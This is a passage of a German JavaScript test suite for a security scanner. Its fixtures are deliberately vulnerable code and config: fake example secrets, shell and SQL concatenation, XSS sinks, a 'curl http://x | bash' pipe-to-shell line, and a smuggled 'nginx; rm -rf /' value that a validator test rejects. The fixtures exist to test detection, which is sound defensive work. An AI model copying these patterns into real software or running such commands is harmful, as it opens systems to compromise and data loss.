'use strict';

// Einfache Test-Suite ohne Framework: prueft die Finder gegen verwundbare Beispiele.
// Start: npm test

const { prescan } = require('../src/core/prescan');
const { cvssFromVector } = require('../src/core/cve');
const { parseOsv, parseGrype, parseTrufflehog, parseBandit } = require('../src/core/tools');
const { estimateCost, isLocalProvider } = require('../src/core/cost');
const { toSarif } = require('../src/core/report');
const { fingerprint, atOrAbove, dedupeFindings } = require('../src/core/schema');
const { makeMatcher } = require('../src/core/ignore');
const { analyzeBinary, detectType } = require('../src/core/binaryaudit');

let pass = 0, fail = 0;
function check(name, cond, info) {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name + (info ? ` (${info})` : '')); }
}

// --- Fixtures (absichtlich verwundbar) ---------------------------------
const units = [
  {
    label: 'app.js', content: `
      const key = "AKIAIOSFODNN7EXAMPLE";
      const stripe = "sk_live_abcd1234567890WXYZ";
      const gh = "github_pat_11ABCDEFG012345678_abcdefghijklmnopqrstuvwxyz";
      const conn = "https://admin:pa55word@db.example.com/x";
      const { exec } = require('child_process'); exec("ls " + userInput);
      el.innerHTML = data;
      const q = "SELECT * FROM u WHERE id=" + id;
      const win = new BrowserWindow({ webPreferences: { nodeIntegration: true, contextIsolation: false } });
      crypto.createCipher('aes-256-ecb', k);
      const t = jwt.verify(tok, { algorithms: ['none'] });
      res.redirect(req.query.next);
    `,
  },
  {
    label: 'settings.py', content: `
SECRET_KEY = 'hardcoded-supersecret-123'
DEBUG = True
import subprocess
subprocess.run(cmd, shell=True)
db = {"$where": "this.a == b"}
`,
  },
  {
    label: 'frameworks.txt', content: `
      http.csrf().disable();
      @CrossOrigin(origins = "*")
      new ProcessBuilder("sh");
      template.HTML(userInput)
      s = "<b>".html_safe
      User.where("name = #{params[:n]}")
      skip_before_action :verify_authenticity_token
      params.permit!
      mysqli_query($c, "SELECT * FROM u WHERE id=" . $_GET['id']);
      include($_GET['page']);
      var cmd = new SqlCommand("select " + x);
      new BinaryFormatter();
      Html.Raw(model.x)
      mark_safe(data)
      Post.objects.raw("select 1")
      @csrf_exempt
      ALLOWED_HOSTS = ['*']
      jwt.sign(payload, 'mysecretkey')
      hook = "https://hooks.slack.com/services/T000/B000/abcdefghij1234567890"
    `,
  },
  {
    label: 'infra.txt', content: `
FROM node:latest
USER root
ENV API_KEY=supersecretvalue
RUN curl http://x | bash
privileged: true
allowPrivilegeEscalation: true
hostNetwork: true
runAsUser: 0
image: app:latest
roleRef: cluster-admin
      - SYS_ADMIN
cidr_blocks = ["0.0.0.0/0"]
acl = "public-read"
publicly_accessible = true
storage_encrypted = false
on: pull_request_target
run: echo \${{ github.event.issue.title }}
permissions: write-all
`,
  },
  { label: 'package.json', content: JSON.stringify({ dependencies: { lodash: '4.17.0' } }) },
  { label: 'secrets.conf', content: 'apiSecret = "aZ3kP9qXr7vB2mL5nW8cE1tY6uI0oD4sFhG7jK2pQ"' },
  { label: 'config/id_rsa', content: 'placeholder' },
  { label: 'app/.env', content: 'FOO=1' },
  { label: 'db/backup.sql', content: 'select 1' },
];

const pre = prescan(units);
const findingTitles = pre.findings.map((f) => f.title);
const hasFinding = (s) => findingTitles.some((t) => t.includes(s));
const patternNames = Object.values(pre.patternSummary).map((p) => p.name).join(' | ');
const hasPattern = (s) => patternNames.includes(s);

console.log('Secret-Finder:');
check('AWS Access Key', hasFinding('AWS Access Key'));
check('Stripe Secret Key', hasFinding('Stripe Secret'));
check('GitHub Fine-grained Token', hasFinding('GitHub Fine-grained'));
check('Zugangsdaten in URL', hasFinding('Zugangsdaten in URL'));

console.log('Code-Risiko-Muster:');
check('Shell-Ausfuehrung', hasPattern('Shell-Ausfuehrung'));
check('SQL-Konkatenation', hasPattern('SQL-Konkatenation'));
check('DOM-HTML (XSS)', hasPattern('DOM-HTML'));
check('Electron nodeIntegration', hasPattern('nodeIntegration'));
check('Electron contextIsolation', hasPattern('contextIsolation'));
check('createCipher', hasPattern('createCipher'));
check('Schwache Chiffre (ECB)', hasPattern('Schwache Chiffre'));
check('JWT none', hasPattern('JWT-Algorithmus'));
check('SECRET_KEY hartkodiert', hasPattern('SECRET_KEY'));
check('shell=True', hasPattern('shell=True'));
check('NoSQL $where', hasPattern('$where'));
check('Open Redirect', hasPattern('Open Redirect'));

console.log('Framework-Finder:');
check('Spring CSRF disabled', hasPattern('CSRF deaktiviert'));
check('Spring CORS Wildcard', hasPattern('CORS-Wildcard'));
check('Java ProcessBuilder', hasPattern('ProcessBuilder'));
check('Go template.HTML', hasPattern('template.HTML'));
check('Rails html_safe', hasPattern('html_safe'));
check('Rails where-Interpolation', hasPattern('SQL-Interpolation in where'));
check('Rails skip CSRF', hasPattern('CSRF-Schutz uebersprungen'));
check('Rails permit!', hasPattern('Mass Assignment'));
check('PHP Eingabe in Query', hasPattern('Eingabe in Query'));
check('PHP LFI/RFI', hasPattern('LFI/RFI'));
check('.NET SqlCommand', hasPattern('SqlCommand mit Konkatenation'));
check('.NET BinaryFormatter', hasPattern('BinaryFormatter'));
check('.NET Html.Raw', hasPattern('Html.Raw'));
check('Django mark_safe', hasPattern('mark_safe'));
check('Django raw/extra', hasPattern('raw/extra SQL'));
check('Django csrf_exempt', hasPattern('csrf_exempt'));
check('Django ALLOWED_HOSTS *', hasPattern('ALLOWED_HOSTS Wildcard'));
check('Hartkodiertes JWT-Secret', hasPattern('Hartkodiertes JWT-Secret'));
check('Slack Webhook', hasFinding('Slack Webhook'));

console.log('Infrastruktur-Finder:');
check('Docker :latest', hasPattern('unpinntes Basis-Image'));
check('Docker USER root', hasPattern('laeuft als root (USER root)'));
check('Docker Secret in ENV', hasPattern('Secret in ENV/ARG'));
check('Pipe nach Shell', hasPattern('Pipe nach Shell'));
check('Container privileged', hasPattern('Container: privileged'));
check('K8s PrivilegeEscalation', hasPattern('Privilege Escalation'));
check('K8s Host-Namespace', hasPattern('Host-Namespace'));
check('K8s runAsUser 0', hasPattern('laeuft als root (runAsNonRoot'));
check('K8s cluster-admin', hasPattern('cluster-admin'));
check('K8s Capabilities', hasPattern('gefaehrliche Capabilities'));
check('Image :latest', hasPattern('Container-Image :latest'));
check('0.0.0.0/0 offen', hasPattern('Offen fuers Internet'));
check('Bucket public-read', hasPattern('Bucket oeffentlich'));
check('DB publicly_accessible', hasPattern('publicly_accessible'));
check('encrypted=false', hasPattern('Verschluesselung deaktiviert'));
check('CI pull_request_target', hasPattern('pull_request_target'));
check('CI untrusted github.event', hasPattern('untrusted github.event'));
check('CI write-all', hasPattern('permissions write-all'));

console.log('Methoden (Entropie / Datei-Audit):');
check('Hohe-Entropie-Secret', hasFinding('hohe Entropie'));
check('Privater Schluessel (id_rsa)', hasFinding('Privater Schluessel'));
check('Zugangsdaten-Datei (.env)', hasFinding('Zugangsdaten-Datei'));
check('Datenbank-Dump (.sql)', hasFinding('Datenbank-Dump'));

console.log('Dependencies:');
check('lodash@4.17.0 geparst', pre.deps.some((d) => d.name === 'lodash' && d.version === '4.17.0'));

console.log('CVSS-Rechner:');
check('CVSS 9.8', cvssFromVector('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H') === 9.8);
check('CVSS ~3.1', cvssFromVector('CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N') === 3.1);
check('CVSS 0 ohne Impact', cvssFromVector('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N') === 0);
check('CVSS v2 ignoriert (null)', cvssFromVector('AV:N/AC:L/Au:N/C:P/I:P/A:P') === null);

console.log('osv-scanner (Parser):');
const osvFixture = {
  results: [{
    source: { path: 'package-lock.json', type: 'lockfile' },
    packages: [{
      package: { name: 'lodash', version: '4.17.11', ecosystem: 'npm' },
      vulnerabilities: [{
        id: 'GHSA-jf85-cpcp-j695',
        aliases: ['CVE-2019-10744'],
        summary: 'Prototype Pollution in lodash',
        affected: [{ ranges: [{ events: [{ introduced: '0' }, { fixed: '4.17.12' }] }] }],
        database_specific: { severity: 'CRITICAL' },
      }],
      groups: [{ ids: ['GHSA-jf85-cpcp-j695'], max_severity: '9.1' }],
    }],
  }],
};
const osvFindings = parseOsv(osvFixture, 'proj');
check('osv: ein Befund erzeugt', osvFindings.length === 1);
check('osv: Severity aus CVSS (critical)', osvFindings[0] && osvFindings[0].severity === 'critical');
check('osv: Kategorie Dependencies', osvFindings[0] && osvFindings[0].category === 'Dependencies');
check('osv: CVE im Titel', osvFindings[0] && osvFindings[0].title.includes('CVE-2019-10744'));
check('osv: behobene Version in Remediation', osvFindings[0] && osvFindings[0].remediation.includes('4.17.12'));
check('osv: leere Ergebnisse -> keine Befunde', parseOsv({ results: [] }, 'proj').length === 0);

console.log('grype (Parser):');
const grypeF = parseGrype({ matches: [{
  vulnerability: { id: 'GHSA-abc', severity: 'Critical', fix: { versions: ['1.2.4'], state: 'fixed' } },
  artifact: { name: 'left-pad', version: '1.0.0', type: 'npm', locations: [{ path: 'package-lock.json' }] },
}] }, 'proj');
check('grype: ein Befund', grypeF.length === 1);
check('grype: Severity critical', grypeF[0] && grypeF[0].severity === 'critical');
check('grype: Kategorie Dependencies', grypeF[0] && grypeF[0].category === 'Dependencies');
check('grype: Fix-Version in Remediation', grypeF[0] && grypeF[0].remediation.includes('1.2.4'));

console.log('trufflehog (Parser):');
const thF = parseTrufflehog('{"DetectorName":"AWS","Verified":true,"Redacted":"AKIA...","SourceMetadata":{"Data":{"Filesystem":{"file":"a.env","line":3}}}}', 'proj');
check('trufflehog: ein Befund', thF.length === 1);
check('trufflehog: verifiziert -> critical', thF[0] && thF[0].severity === 'critical');
check('trufflehog: Kategorie Secrets', thF[0] && thF[0].category === 'Secrets');
check('trufflehog: Ort mit Zeile', thF[0] && thF[0].location === 'a.env:3');

console.log('bandit (Parser):');
const banF = parseBandit({ results: [{
  test_id: 'B602', test_name: 'subprocess_popen_with_shell_equals_true', issue_severity: 'HIGH',
  issue_confidence: 'HIGH', issue_text: 'subprocess call with shell=True', filename: 'a.py', line_number: 5, more_info: 'http://x',
}] }, 'proj');
check('bandit: ein Befund', banF.length === 1);
check('bandit: Severity high', banF[0] && banF[0].severity === 'high');
check('bandit: Ort mit Zeile', banF[0] && banF[0].location === 'a.py:5');

console.log('Kosten-/Token-Schätzung:');
const cA = estimateCost({ provider: 'anthropic', model: 'claude-opus-5-5', inputTokens: 1e6, outputTokens: 1e6 });
check('cost: Opus 5.5 = $24 / 2M Tokens', cA.priced === true && cA.usd === 24);
check('cost: nicht lokal', cA.local === false);
const cO = estimateCost({ provider: 'ollama', model: 'qwen2.5-coder', inputTokens: 1000, outputTokens: 1000 });
check('cost: Ollama lokal & kostenlos', cO.local === true && cO.usd === 0 && cO.priced === false);
const cU = estimateCost({ provider: 'anthropic', model: 'unbekanntes-modell', inputTokens: 1000, outputTokens: 1000 });
check('cost: unbekanntes Modell -> keine $-Schätzung', cU.priced === false && cU.local === false);
check('cost: compat localhost = lokal', isLocalProvider('compat', 'http://localhost:1234/v1') === true);
check('cost: compat Cloud = nicht lokal', isLocalProvider('compat', 'https://api.mistral.ai/v1') === false);

console.log('SARIF-Export:');
const sres = { findings: [
  { title: 'A', severity: 'critical', category: 'Secrets', location: 'a.js:5', description: 'd', cvss: 9, confidence: 'high', source: 'ai' },
  { title: 'B', severity: 'medium', category: 'Config', location: 'b.yml:2' },
  { title: 'C', severity: 'info', category: 'Other', location: '' },
], summary: {}, meta: {} };
const sarif = JSON.parse(toSarif(sres));
check('sarif: Version 2.1.0', sarif.version === '2.1.0');
check('sarif: 3 results', sarif.runs[0].results.length === 3);
check('sarif: critical -> error', sarif.runs[0].results[0].level === 'error');
check('sarif: medium -> warning', sarif.runs[0].results[1].level === 'warning');
check('sarif: info -> note', sarif.runs[0].results[2].level === 'note');
check('sarif: Ort/Zeile geparst', sarif.runs[0].results[0].locations[0].physicalLocation.region.startLine === 5);
check('sarif: Regeln vorhanden', Array.isArray(sarif.runs[0].tool.driver.rules) && sarif.runs[0].tool.driver.rules.length >= 1);

console.log('Fingerprint:');
const fpA = fingerprint({ category: 'Secrets', location: 'a.js:5', title: 'X' });
const fpB = fingerprint({ category: 'Secrets', location: 'a.js:5', title: 'X' });
const fpC = fingerprint({ category: 'Secrets', location: 'b.js:9', title: 'X' });
check('fingerprint: stabil', fpA === fpB);
check('fingerprint: ortsabhängig', fpA !== fpC);

console.log('Duplikate zusammenfuehren:');
{
  const F = (o) => ({ severity: 'medium', category: 'Other', confidence: 'medium', cvss: null, description: '', reachability: '', impact: '', remediation: '', patch: '', ...o });
  const d = dedupeFindings([
    F({ title: 'Moegliches Secret im Klartext: AWS Access Key ID', category: 'Secrets', severity: 'high', location: 'src/app.js:2', source: 'prescan' }),
    F({ title: 'gitleaks: aws-access-token', category: 'Secrets', severity: 'high', location: 'C:\\proj\\src\\app.js:2', source: 'gitleaks', remediation: 'Schluessel rotieren und aus dem Code entfernen.' }),
    F({ title: 'Verwundbare Abhaengigkeit: lodash 4.17.15 (CVE-2020-8203)', category: 'Dependencies', location: 'npm: lodash@4.17.15', source: 'osv', cvss: 7.4 }),
    F({ title: 'trivy: lodash@4.17.15 (CVE-2020-8203)', category: 'Dependencies', severity: 'high', location: 'package-lock.json', source: 'trivy' }),
    F({ title: 'SQL-Injection in getUser', category: 'Injection', severity: 'critical', location: 'db.js:40', source: 'ai' }),
    F({ title: 'SQL Injection in getUser()', category: 'Injection', severity: 'high', location: 'db.js line 41', source: 'ai', patch: 'db.query("... WHERE id = ?", [id])' }),
    F({ title: 'Command Injection ueber exec', category: 'Injection', severity: 'high', location: 'db.js:90', source: 'ai' }),
    F({ title: 'Hartkodiertes Passwort', category: 'Secrets', location: 'db.js:40', source: 'ai' }),
  ]);
  check('dedupe: 8 -> 5 Befunde', d.length === 5);
  const sec = d.find((f) => f.category === 'Secrets' && f.sources.includes('gitleaks'));
  check('dedupe: Secret aus prescan+gitleaks vereint', sec && sec.sources.length === 2 && /rotieren/.test(sec.remediation));
  const dep = d.find((f) => f.category === 'Dependencies');
  check('dedupe: CVE ueber Tools vereint, hoechster Grad + CVSS', dep && dep.severity === 'high' && dep.cvss === 7.4);
  const sql = d.find((f) => /SQL/.test(f.title));
  check('dedupe: KI-Doppel (Zeile +-1) vereint, kritisch bleibt', sql && sql.severity === 'critical' && !!sql.patch);
  check('dedupe: andere Kategorie gleiche Zeile bleibt getrennt', d.some((f) => f.title === 'Hartkodiertes Passwort'));
  check('dedupe: Einzelbefund behaelt sources', d.every((f) => Array.isArray(f.sources) && f.sources.length >= 1));
}

console.log('Duplikate bei Web-Zielen (KI-Freitext + Sammel-Befunde):');
{
  const { normalizeFinding: nf } = require('../src/core/schema');
  const W = (title, location, source, severity = 'low', category = 'Config') => nf({ title, location, severity, category }, source);
  const raw = [
    W('Fehlende HTTP-Sicherheits-Header (HSTS, CSP, X-Content-Type-Options, X-Frame-Options)', 'https://shop.example - HTTP-Response-Header der 301-Antwort', 'ai', 'medium'),
    W('Content-Security-Policy fehlt', 'https://www.shop.example/de', 'webscan', 'medium'),
    W('Fehlende Security-Header in HTTP-Antwort', 'https://shop.example (301-Antwort, Response-Header)', 'ai'),
    W('Fehlende HTTP-Sicherheits-Header (HSTS, CSP, X-Content-Type-Options etc.)', 'https://shop.example - Response-Header der 301-Antwort', 'ai', 'low', 'Transport'),
    W('Fehlende HTTP Strict-Transport-Security (HSTS)', 'https://shop.example - Response-Header (301 Redirect)', 'ai', 'low', 'Transport'),
    W('Server-Banner gibt Software-Typ preis', "https://shop.example - Header 'server: nginx'", 'ai', 'low', 'Logging'),
    W('Clickjacking-Schutz fehlt', 'https://www.shop.example/de', 'webscan'),
    W('Server-Banner offengelegt (nginx)', 'https://shop.example - Header', 'ai', 'info', 'Logging'),
    W('Server-Banner offenbart eingesetzte Software (nginx)', 'https://shop.example -> Response-Header', 'ai', 'info'),
    W('Offener Port 80/http', 'shop.example:80', 'nmap', 'info'),
    W('Offener Port 443/ssl/http', 'shop.example:443', 'nmap', 'info'),
    W('Content-Security-Policy fehlt', 'https://other.example/', 'webscan', 'medium'),
  ];
  const d = dedupeFindings(raw);
  const t = (re) => d.filter((f) => re.test(f.title));
  check('web-dedupe: 12 -> 7 Befunde', d.length === 7);
  check('web-dedupe: CSP pro Host genau einmal', t(/Content-Security-Policy fehlt/).length === 2);
  check('web-dedupe: Banner fuenffach -> einmal', t(/Banner/).length === 1);
  check('web-dedupe: Sammel-Befund nur mit Rest-Header', t(/X-Content-Type-Options/).length === 1 && !d.some((f) => /HSTS, CSP/.test(f.title)));
  check('web-dedupe: KI als zusaetzliche Quelle bei CSP', d.find((f) => /Content-Security/.test(f.title) && /shop/.test(f.location)).sources.includes('ai'));
  check('web-dedupe: Ports gebuendelt', t(/^Offene Ports: 80\/http, 443/).length === 1);
  check('web-dedupe: Ort ohne KI-Freitext', d.every((f) => !/\s/.test(f.location)) && d.some((f) => f.locationDetail));
}

console.log('.vigilignore (Matcher):');
const m = makeMatcher(['*.log', 'node_modules/', '**/*.min.js', '# kommentar', 'secrets.txt']);
check('ignore: *.log trifft Basenamen', m('src/app.log', 'app.log') === true);
check('ignore: **/*.min.js', m('a/b/c.min.js', 'c.min.js') === true);
check('ignore: node_modules', m('node_modules', 'node_modules') === true);
check('ignore: Nicht-Treffer', m('src/app.js', 'app.js') === false);

console.log('Binary-Analyse:');
const pe = Buffer.concat([Buffer.from([0x4d, 0x5a]), Buffer.from(' VirtualAlloc WriteProcessMemory CreateRemoteThread LoadLibraryA ', 'ascii')]);
check('binary: detectType PE', detectType(pe).includes('PE'));
const bf = analyzeBinary(pe, 'mal.exe');
check('binary: API-Häufung -> Befund', bf.length >= 1 && /API-Aufrufe/.test(bf[0].title));
check('binary: Quelle = binary', bf[0] && bf[0].source === 'binary');
check('binary: harmlos -> kein Befund', analyzeBinary(Buffer.from('AAAAAAAAAAAAAAAAAAAA', 'ascii'), 'plain.bin').length === 0);

console.log('Eigene Regeln / Regeln deaktivieren:');
const preC = prescan([{ label: 'x', content: 'tok ACME-123456 und AKIAIOSFODNN7EXAMPLE' }], {
  customSecrets: [{ name: 'Acme', regex: 'ACME-[0-9]{6}', severity: 'high' }],
  disabledRules: ['AWS Access Key ID'],
});
check('eigene Regel trifft', preC.findings.some((f) => f.title.includes('Acme')));
check('eigene Regel Severity high', preC.findings.some((f) => f.title.includes('Acme') && f.severity === 'high'));
check('deaktivierte Regel greift nicht', !preC.findings.some((f) => f.title.includes('AWS Access Key')));

console.log('CLI --fail-on (atOrAbove):');
const cc = { critical: 1, high: 2, medium: 3, low: 0, info: 5 };
check('atOrAbove high = 3', atOrAbove(cc, 'high') === 3);
check('atOrAbove critical = 1', atOrAbove(cc, 'critical') === 1);
check('atOrAbove info = alle (11)', atOrAbove(cc, 'info') === 11);
check('atOrAbove unbekannt = 0', atOrAbove(cc, 'quatsch') === 0);

console.log('Harness (Schwaerzen, Slices, Gegenpruefung, Belege):');
(async () => {
  const providers = require('../src/core/providers');
  const { redactSecrets, shouldRedact, extractSlice, validateFindings, enrich } = require('../src/core/harness');

  const red = redactSecrets('const k = "AKIAIOSFODNN7EXAMPLE"; const ok = 1;');
  check('redact: AWS-Key geschwaerzt', red.count === 1 && !red.text.includes('IOSFODNN7EXAMPLE') && red.text.includes('const ok = 1'));
  check('redact: nur bei externem Anbieter', shouldRedact({ provider: 'anthropic' }) && !shouldRedact({ provider: 'ollama' }));
  check('redact: abschaltbar', !shouldRedact({ provider: 'openai', redactSecrets: false }));

  const code = Array.from({ length: 80 }, (_, i) => `line ${i + 1}`).join('\n');
  const hUnits = [{ label: 'src/routes/orders.js', content: code.replace('line 40', 'app.get("/o/:id", (req, res) => db.query("SELECT " + req.params.id))') }];
  const sl = extractSlice(hUnits, 'C:\\proj\\src\\routes\\orders.js:40', 5);
  check('slice: richtige Datei + Fenster', sl && sl.from === 35 && sl.to === 45 && /40 >/.test(sl.text));

  const F = (o) => ({ severity: 'high', category: 'Injection', confidence: 'medium', cvss: null, description: 'd', reachability: '', impact: '', remediation: '', patch: '', source: 'ai', sources: ['ai'], ...o });
  const fs3 = [
    F({ title: 'SQLi', location: 'src/routes/orders.js:40' }),
    F({ title: 'Erfunden', location: 'src/routes/orders.js:70' }),
    F({ title: 'Unklar', location: 'src/routes/orders.js:10' }),
    F({ title: 'Secret', category: 'Secrets', location: 'src/routes/orders.js:1', source: 'prescan', sources: ['prescan', 'ai'] }),
  ];
  let sent = '';
  const orig = providers.callProvider;
  providers.callProvider = async (_cfg, { user }) => {
    sent = user;
    return { text: JSON.stringify({ verdicts: [{ id: 0, verdict: 'confirmed', reason: 'Konkatenation belegt' }, { id: 1, verdict: 'refuted', reason: 'Stelle existiert nicht' }, { id: 2, verdict: 'uncertain', reason: '?' }] }), usage: { inputTokens: 10, outputTokens: 5 } };
  };
  const v = await validateFindings({ findings: fs3, units: hUnits, config: { provider: 'ollama' } });
  providers.callProvider = orig;
  check('validate: widerlegter Befund faellt raus', v.refuted.length === 1 && !v.findings.some((f) => f.title === 'Erfunden'));
  check('validate: unsicher -> confidence low', v.findings.find((f) => f.title === 'Unklar').confidence === 'low');
  check('validate: deterministische Befunde nicht gegengeprueft', !/Secret/.test(sent) && v.findings.some((f) => f.title === 'Secret'));
  check('validate: Code-Slice im Prompt', /SELECT/.test(sent));

  // KI-Gegencheck fuer Regel-Befunde: Zweifel stuft herab (nie loeschen), Hinweise des Laufs gehen mit
  {
    const { reviewRuleFindings } = require('../src/core/harness');
    const rf = [
      F({ title: 'Ähnliche Domain kann Mails empfangen: a.com', severity: 'medium', source: 'typo-domains', sources: ['typo-domains'], evidence: 'a.com: MX vorhanden' }),
      F({ title: 'Header fehlt', severity: 'medium', source: 'webscan', sources: ['webscan'] }),
      F({ title: 'Nur Hinweis', severity: 'info', source: 'webscan', sources: ['webscan'] }),
      F({ title: 'KI-Fund', severity: 'high' }),
    ];
    let prompt = '', calls = 0;
    providers.callProvider = async (_cfg, { user }) => { calls++; prompt = user; return { text: JSON.stringify({ verdicts: [{ id: 0, verdict: 'doubtful', reason: 'Laut Hinweis leitet a.com auf die eigene Seite weiter.' }, { id: 1, verdict: 'plausible', reason: 'Header fehlt laut Beleg.' }] }), usage: { inputTokens: 5, outputTokens: 5 } }; };
    const r = await reviewRuleFindings({ findings: rf, notes: ['Tippfehler-Domains, als deine erkannt: a.com (leitet auf www.a.de weiter)'], config: { provider: 'ollama', model: 'x', lang: 'de' } });
    providers.callProvider = orig;
    const d = r.findings.find((f) => /a\.com/.test(f.title));
    check('ki-gegencheck: Zweifel stuft eine Stufe herab, Befund bleibt', d && d.severity === 'low' && d.severityOriginal === 'medium' && d.confidence === 'low' && d.validation.verdict === 'doubted' && r.findings.length === 4 && r.doubted === 1);
    check('ki-gegencheck: plausibel bleibt unverändert, nur Regel-Befunde ab mittel', r.findings.find((f) => f.title === 'Header fehlt').severity === 'medium' && !/Nur Hinweis|KI-Fund/.test(prompt) && /leitet a\.com|leitet auf www\.a\.de/.test(prompt) && calls === 1);
    const off = await reviewRuleFindings({ findings: rf, config: { provider: 'ollama', model: 'x', aiReview: false } });
    check('ki-gegencheck: abschaltbar und ohne KI still', off.findings === rf && (await reviewRuleFindings({ findings: rf, config: {} })).reviewed === 0);
  }

  const en = enrich(v.findings, hUnits);
  const byT = (t) => en.find((f) => f.title === t);
  check('evidence: KI bestaetigt -> ai-verified', byT('SQLi').assurance === 'ai-verified');
  check('evidence: unsicher -> unverified', byT('Unklar').assurance === 'unverified');
  check('evidence: prescan+ai -> confirmed-multi', byT('Secret').assurance === 'confirmed-multi');
  check('context: Route -> request-handler', byT('SQLi').context.includes('request-handler'));

  console.log('Validierung, Schwaerzung, Scanner-Parser:');
  {
    const { check: zcheck, TargetSchema, ScanRequestSchema, StatusUpdateSchema } = require('../src/core/validation');
    const { redactSecret, normalizeFinding } = require('../src/core/schema');
    const { parseGitleaks, parseTrivy } = require('../src/core/tools');
    check('zod: gueltige URL ok', zcheck(TargetSchema, { type: 'url', value: 'https://a.example' }).ok);
    check('zod: URL ohne Schema abgelehnt', !zcheck(TargetSchema, { type: 'url', value: 'a.example' }).ok);
    check('zod: Image-Referenz ok', zcheck(TargetSchema, { type: 'image', value: 'ghcr.io/org/app:2.1' }).ok);
    check('zod: Image mit Shell-Zeichen abgelehnt', !zcheck(TargetSchema, { type: 'image', value: 'nginx; rm -rf /' }).ok);
    check('zod: Steuerzeichen abgelehnt', !zcheck(TargetSchema, { type: 'path', value: 'a\nb' }).ok);
    check('zod: leere Zielliste abgelehnt', !zcheck(ScanRequestSchema, { targets: [] }).ok);
    check('zod: unbekannter Status abgelehnt', !zcheck(StatusUpdateSchema, { status: 'DONE' }).ok);
    check('redact: 70 % maskiert', redactSecret('sk_live_abcdef1234567890') === 'sk_****REDACTED****890');
    check('redact: kurz -> komplett', redactSecret('abc123') === '****REDACTED****');
    const nf = normalizeFinding({ title: 'trivy: x (CVE-2024-1234)', severity: 'high', category: 'Dependencies' }, 'trivy');
    check('ruleId: CVE aus Titel', nf.ruleId === 'CVE-2024-1234');
    const gl = parseGitleaks(JSON.stringify([{ RuleID: 'aws-access-token', File: 'a.js', StartLine: 3, Secret: 'AKIAIOSFODNN7EXAMPLE' }]));
    check('gitleaks: geparst + Regel-ID', gl.length === 1 && gl[0].ruleId === 'aws-access-token');
    check('gitleaks: Klartext-Secret nie gespeichert', !JSON.stringify(gl).includes('IOSFODNN7EXAMP') && gl[0].evidence === 'AKI****REDACTED****PLE');
    check('gitleaks: kaputte Ausgabe -> null', parseGitleaks('{"oops":1}') === null);
    const tv = parseTrivy(JSON.stringify({ Results: [{ Target: 'nginx:1.25 (debian 12)', Vulnerabilities: [{ VulnerabilityID: 'CVE-2023-44487', PkgName: 'libnghttp2', InstalledVersion: '1.52', Severity: 'HIGH' }], Misconfigurations: [{ ID: 'DS002', Title: 'Image user should not be root', Severity: 'HIGH' }] }] }), 'nginx:1.25');
    check('trivy: Vuln + Misconfig', tv.length === 2 && tv[0].ruleId === 'CVE-2023-44487' && tv[1].ruleId === 'DS002');
    const { enrich: enrich2 } = require('../src/core/harness');
    const { dedupeFindings: dd } = require('../src/core/schema');
    const kept = enrich2(dd([{ ...gl[0], location: 'a.js:3' }, normalizeFinding({ title: 'Secret im Code', severity: 'critical', category: 'Secrets', location: 'a.js:3' }, 'ai')]));
    check('evidence: Fundstelle bleibt nach Merge + Anreicherung erhalten', kept.length === 1 && kept[0].evidence === 'AKI****REDACTED****PLE' && kept[0].assurance === 'confirmed-multi');
  }

  console.log('Scope-Durchsetzung:');
  {
    const { enforceScope, isInternalHost, isAllowlisted } = require('../src/core/scope');
    check('scope: Pfad immer erlaubt', enforceScope([{ type: 'path', value: 'C:\\x' }], []).ok);
    check('scope: URL ohne Freigabe abgelehnt (API)', !enforceScope([{ type: 'url', value: 'https://a.example' }], []).ok);
    check('scope: URL auf Allowlist ok', enforceScope([{ type: 'url', value: 'https://shop.a.example/x' }], ['a.example']).targets[0].authorized === true);
    const ia = enforceScope([{ type: 'endpoint', value: '192.168.1.5:8443', authorized: true }], [], { interactive: true });
    check('scope: UI-Bestaetigung gibt Host frei', ia.ok && ia.allow[0] === '192.168.1.5');
    check('scope: API ignoriert authorized-Flag', !enforceScope([{ type: 'url', value: 'https://b.example', authorized: true }], []).ok);
    check('scope: *.x nur Subdomains', isAllowlisted('a.x.example', ['*.x.example']) && !isAllowlisted('x.example', ['*.x.example']));
    check('scope: interne Adressen erkannt', isInternalHost('10.0.0.1') && isInternalHost('server.local') && !isInternalHost('8.8.8.8'));
  }

  console.log('Befund-Lebenszyklus:');
  {
    const store = require('../src/core/store');
    const db = store.emptyStore();
    const tgt = [{ type: 'path', value: 'C:\\proj' }];
    const F = (o) => ({ severity: 'high', category: 'Secrets', cvss: null, description: '', remediation: '', source: 'prescan', sources: ['prescan'], ...o });
    const a = F({ ruleId: 'secret-aws', title: 'AWS', location: 'proj/a.js:1' });
    const b = F({ ruleId: 'secret-gh', title: 'GH', location: 'proj/b.js:2' });
    const ai = F({ ruleId: 'idor', title: 'IDOR', location: 'proj/c.js:9', source: 'ai', sources: ['ai'], category: 'AccessControl' });
    const ran = [{ target: 'C:\\proj', source: 'prescan' }];
    const r1 = store.applyRun(db, { targets: tgt, findings: [a, b, ai], scannersRun: ran, now: '2026-11-01T10:00:00Z' });
    check('lifecycle: neue Befunde OPEN', r1.counters.created === 3 && r1.findings.every((f) => f.status === 'OPEN' && f.isNew));
    const idA = r1.findings[0].id, idB = r1.findings[1].id;
    check('lifecycle: Fingerabdruck SHA-256', /^[a-f0-9]{64}$/.test(idA));
    store.setStatus(db, idB, 'FALSE_POSITIVE');
    const r2 = store.applyRun(db, { targets: tgt, findings: [b], scannersRun: ran, now: '2026-11-02T10:00:00Z' });
    check('lifecycle: fehlender Befund -> RESOLVED', db.findings[idA].status === 'RESOLVED' && r2.counters.resolved === 1);
    check('lifecycle: FALSE_POSITIVE bleibt + lastSeen', db.findings[idB].status === 'FALSE_POSITIVE' && db.findings[idB].lastSeenAt === '2026-11-02T10:00:00Z' && r2.findings[0].suppressed);
    check('lifecycle: KI-Befund nicht auto-geschlossen', Object.values(db.findings).find((f) => f.ruleId === 'idor').status === 'OPEN');
    const r3 = store.applyRun(db, { targets: tgt, findings: [a, b], scannersRun: ran, now: '2026-11-03T10:00:00Z' });
    check('lifecycle: RESOLVED taucht wieder auf -> OPEN (Regression)', db.findings[idA].status === 'OPEN' && r3.findings[0].regression);
    check('lifecycle: firstSeen bleibt erhalten', db.findings[idA].firstSeenAt === '2026-11-01T10:00:00Z');
    store.applyRun(db, { targets: tgt, findings: [], scannersRun: [], now: '2026-11-04T10:00:00Z' });
